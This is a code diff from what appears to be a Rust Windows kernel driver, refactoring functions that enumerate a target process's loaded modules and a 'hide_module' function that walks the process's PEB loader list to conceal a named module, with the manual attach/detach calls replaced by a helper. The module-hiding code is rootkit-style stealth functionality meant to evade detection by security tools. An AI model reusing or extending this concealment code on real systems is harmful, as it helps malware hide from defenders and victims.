@@ -1,23 +1,20 @@
 use {
+    winapi::shared::ntdef::LIST_ENTRY,
+    ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PEB}, 
+    shared::structs::{ModuleInfo, TargetModule, TargetProcess}, 
+    wdk_sys::{
+        ntddk::IoGetCurrentProcess, 
+        FILE_OBJECT, NTSTATUS, POOL_FLAG_NON_PAGED, RTL_BALANCED_NODE, 
+        STATUS_INVALID_ADDRESS, STATUS_INVALID_PARAMETER, STATUS_UNSUCCESSFUL, 
+        _MODE::KernelMode
+    },
     crate::{
         includes::{
             structs::MMVAD_SHORT, vad::MMVAD, 
             MmCopyVirtualMemory, PsGetProcessPeb
         }, 
-        process::Process, utils::pool::PoolMemory
+        process::Process, utils::{pool::PoolMemory, process_attach::ProcessAttach}
     }, 
-    ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PEB}, 
-    shared::structs::{ModuleInfo, TargetProcess, TargetModule}, 
-    wdk_sys::{
-        ntddk::{
-            IoGetCurrentProcess, KeStackAttachProcess, 
-            KeUnstackDetachProcess,
-        }, 
-        FILE_OBJECT, KAPC_STATE, NTSTATUS, POOL_FLAG_NON_PAGED, RTL_BALANCED_NODE, 
-        STATUS_INVALID_ADDRESS, STATUS_INVALID_PARAMETER, STATUS_UNSUCCESSFUL, 
-        _MODE::KernelMode
-    }, 
-    winapi::shared::ntdef::LIST_ENTRY
 };
 
 pub mod ioctls;
@@ -45,7 +42,6 @@ impl Module {
         log::info!("Starting module enumeration");
          
         let pid = (*process).pid;
-        let mut apc_state: KAPC_STATE = core::mem::zeroed();
         let temp_info_size =  256 * core::mem::size_of::<ModuleInfo>();
 
         // Allocates memory for temporarily storing module information
@@ -58,12 +54,11 @@ impl Module {
 
         // Attaches the target process to the current context
         let target = Process::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
-        KeStackAttachProcess(target.e_process, &mut apc_state);
-        
+        let mut attach_process = ProcessAttach::new(target.e_process);
+
         // Gets the PEB (Process Environment Block) of the target process
         let target_peb = PsGetProcessPeb(target.e_process) as *mut PEB;
         if target_peb.is_null() || (*target_peb).Ldr.is_null() {
-            KeUnstackDetachProcess(&mut apc_state);
             return Err(STATUS_INVALID_PARAMETER);
         }
 
@@ -75,14 +70,12 @@ impl Module {
         while next != current  {
             if next.is_null() {
                 log::error!("Next LIST_ENTRY is null");
-                KeUnstackDetachProcess(&mut apc_state);
                 return Err(STATUS_UNSUCCESSFUL);
             }
 
             let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
             if list_entry.is_null() {
                 log::error!("LDR_DATA_TABLE_ENTRY is null");
-                KeUnstackDetachProcess(&mut apc_state);
                 return Err(STATUS_UNSUCCESSFUL);
             }
 
@@ -90,7 +83,6 @@ impl Module {
             let buffer = core::slice::from_raw_parts((*list_entry).FullDllName.Buffer, ((*list_entry).FullDllName.Length / 2) as usize);
             if buffer.is_empty() {
                 log::error!("Buffer for module name is empty");
-                KeUnstackDetachProcess(&mut apc_state);
                 return Err(STATUS_UNSUCCESSFUL);
             }
 
@@ -106,7 +98,7 @@ impl Module {
         }
 
         // Detaches the target process
-        KeUnstackDetachProcess(&mut apc_state);
+        attach_process.detach();
     
         // Copies module information to the caller's space
         let size_to_copy = count as usize * core::mem::size_of::<ModuleInfo>();
@@ -137,13 +129,11 @@ impl Module {
     pub unsafe fn hide_module(target: *mut TargetModule) -> Result<(), NTSTATUS> {
         let pid = (*target).pid;
         let module_name = &(*target).module_name.to_lowercase();
-        let mut apc_state: KAPC_STATE = core::mem::zeroed();
         let target = Process::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
+        let mut attach_process = ProcessAttach::new(target.e_process);
 
-        KeStackAttachProcess(target.e_process, &mut apc_state);
         let target_peb = PsGetProcessPeb(target.e_process) as *mut PEB;
         if target_peb.is_null() || (*target_peb).Ldr.is_null() {
-            KeUnstackDetachProcess(&mut apc_state);
             return Err(STATUS_INVALID_PARAMETER);
         }
         
@@ -154,21 +144,18 @@ impl Module {
         while next != current {
             if next.is_null() {
                 log::error!("Next LIST_ENTRY is null");
-                KeUnstackDetachProcess(&mut apc_state);
                 return Err(STATUS_UNSUCCESSFUL);
             }
 
             let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
             if list_entry.is_null() {
                 log::error!("LDR_DATA_TABLE_ENTRY is null");
-                KeUnstackDetachProcess(&mut apc_state);
                 return Err(STATUS_UNSUCCESSFUL);
             }
 
             let buffer = core::slice::from_raw_parts((*list_entry).FullDllName.Buffer, ((*list_entry).FullDllName.Length / 2) as usize);
             if buffer.is_empty() {
                 log::error!("Buffer for module name is empty");
-                KeUnstackDetachProcess(&mut apc_state);
                 return Err(STATUS_UNSUCCESSFUL);
             }
 
@@ -187,7 +174,7 @@ impl Module {
         }
     
         // Detaches the target process
-        KeUnstackDetachProcess(&mut apc_state);
+        attach_process.detach();
 
         if !address.is_null() {
             Self::hide_object(address as u64, target);
